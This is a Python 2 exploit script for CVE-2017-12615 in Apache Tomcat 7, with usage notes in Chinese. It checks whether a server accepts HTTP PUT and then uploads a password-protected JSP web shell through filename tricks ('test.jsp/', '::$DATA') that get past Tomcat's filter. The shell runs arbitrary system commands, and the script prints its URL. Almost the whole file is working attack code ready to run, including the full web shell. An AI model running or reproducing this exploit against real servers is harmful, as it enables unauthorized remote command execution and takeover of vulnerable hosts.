#! -*- coding:utf-8 -*-
__author__="浮萍"
__Date__="20170920"


'''
Usage:
    python CVE-2017-12615.py www.example.com:8080
	
	python CVE-2017-12615.py 192.168.135.132
	
	shell：http://192.168.135.132/1505876909.jsp?cmd=whoami&pwd=023
	
Python version: 2.7.13

tomcat:apache-tomcat-7.0.70 apache-tomcat-7.0.81

在apache-tomcat-7.0.70 apache-tomcat-7.0.81测试成功。
apache-tomcat-7.0.70文件名可为 put  test.jsp/ 和 put  test.jsp::$DATA
apache-tomcat-7.0.81文件名可为put test.jsp/
文件名也可以试试 test.jsp/. 来绕过
'''
 
import httplib
import sys
import time

body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
try:
    conn = httplib.HTTPConnection(sys.argv[1])
    conn.request(method='OPTIONS', url='/ffffzz')
    headers = dict(conn.getresponse().getheaders())
    if 'allow' in headers and \
       headers['allow'].find('PUT') > 0 :
        conn.close()
        conn = httplib.HTTPConnection(sys.argv[1])
        url = "/" + str(int(time.time()))+'.jsp/'
        #url = "/" + str(int(time.time()))+'.jsp::$DATA'
        conn.request( method='PUT', url= url, body=body)
        res = conn.getresponse()
        if res.status  == 201 :
            #print 'shell:', 'http://' + sys.argv[1] + url[:-7]
            print 'shell:', 'http://' + sys.argv[1] + url[:-1]
        elif res.status == 204 :
            print 'file exists'
        else:
            print 'error'
        conn.close()

    else:
        print 'Server not vulnerable'
        
except Exception,e:
    print 'Error:', e